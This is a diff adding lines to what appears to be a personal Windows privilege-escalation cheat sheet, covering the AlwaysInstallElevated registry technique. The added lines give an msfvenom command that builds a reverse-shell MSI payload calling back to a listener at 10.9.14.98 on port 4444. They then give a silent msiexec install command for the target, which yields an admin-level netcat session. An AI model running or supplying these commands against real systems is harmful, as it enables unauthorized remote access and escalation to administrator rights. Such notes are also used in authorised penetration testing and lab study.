@@ -84,6 +84,14 @@ HERE'S HOW I APPROACH FOR ESCALATING PRIVILEDGES:
             reg query HKCU\Software\Policies\Microsoft\Windows\Installer
             
             If they gave output as 1 then this means we can create our payload in msi format and can escalate priv
+            
+            msfvenom -p windows/shell_reverse_tcp LHOST=10.9.14.98 LPORT=4444 -f msi > access.msi
+
+            Transfer it to target machine
+            
+            msiexec /quiet /qn /i C:\Users\user\access.msi
+ 
+            Netcat session with admin rights
 6- Registry (Modified autorun): Need to have admin login to work
 -------------------------------------------------------------------------------------------------
 
